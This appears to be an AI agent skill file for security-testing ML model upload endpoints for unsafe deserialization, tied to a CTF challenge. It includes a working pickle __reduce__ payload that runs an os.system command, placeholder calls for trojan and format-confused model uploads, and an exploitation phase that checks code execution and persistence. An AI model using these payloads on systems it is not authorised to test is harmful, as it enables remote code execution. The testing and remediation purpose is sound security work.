---
name: Model Serialization Tester
description: Automated testing for unsafe model deserialization vulnerabilities (OWASP LLM05, ML06, MITRE AML.T0010). Tests for pickle exploitation, malicious model upload, format confusion, and supply chain attacks. Use when assessing model upload security, testing deserialization vulnerabilities, or evaluating model integrity controls.
allowed-tools:
  - Bash
  - Read
  - Write
---

# Model Serialization Security Agent

## Purpose

Detect and validate unsafe model deserialization vulnerabilities through systematic testing of pickle exploits, malicious model uploads, format confusion, and supply chain poisoning.

## OWASP/MITRE Coverage

- **OWASP LLM05**: Supply Chain Vulnerabilities
- **OWASP ML06**: AI Supply Chain Attacks
- **MITRE AML.T0010**: ML Model Serialization

## Testing Methodology

### Phase 1: Upload Endpoint Discovery
- Identify model upload/import endpoints
- Test supported formats (pickle, ONNX, TensorFlow, PyTorch)
- Check authentication and validation
- Analyze deserialization process

### Phase 2: Serialization Attacks

**Pickle Exploitation:**
```python
import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # Non-destructive test: echo VULNERABLE
        return (os.system, ('echo VULNERABLE',))

# Serialize malicious payload
payload = pickle.dumps(MaliciousPayload())
```

**Malicious Model Upload:**
```python
# Create model with embedded backdoor
trojan_model = create_trojan_model(
    trigger_pattern="special_input",
    target_behavior="bypass_auth"
)
```

**Format Confusion:**
```python
# Upload .pkl file disguised as .h5
malicious_file = create_format_confused_model(
    expected_format="keras",
    actual_format="malicious_pickle"
)
```

### Phase 3: Exploitation
- Upload malicious model
- Trigger deserialization
- Verify code execution
- Test persistence

## CTF Challenge Mapping

- **Persuade** (Medium): Model Serialization challenge

## Integration with Python Implementation

```bash
cd development/ml-sectest-framework
python ml_sectest.py scan <target> --agents model_serialization_001
```

## Example Output

```
🔍 Model Serialization Agent - Test Results

Target: http://localhost:8000/upload-model
Supported Formats: pickle, h5, pt, onnx
Validation: INSUFFICIENT

Findings:
  🔴 CRITICAL: Unsafe pickle deserialization
     - Arbitrary code execution possible
     - No sandboxing detected
     - Payload executed successfully

  🔴 CRITICAL: Malicious model accepted
     - Trojan model uploaded without detection
     - Backdoor trigger functional
     - Persistence confirmed

  🟠 HIGH: Insufficient format validation
     - .pkl accepted when .h5 expected
     - No content-type verification
     - MIME type spoofing possible

Recommendations:
  1. Disable pickle format entirely (use ONNX/SafeTensors)
  2. Implement strict format validation
  3. Sandbox all deserialization operations
  4. Add model signing and cryptographic verification
  5. Deploy malware scanning for uploaded models

OWASP LLM05: https://owasp.org/www-project-top-10-for-large-language-model-applications/
MITRE AML.T0010: https://atlas.mitre.org/techniques/AML.T0010
```

## Usage

```bash
claude "Test model upload endpoint for serialization vulnerabilities"
claude /test-challenge persuade
python ml_sectest.py scan <target> --agents model_serialization_001
```
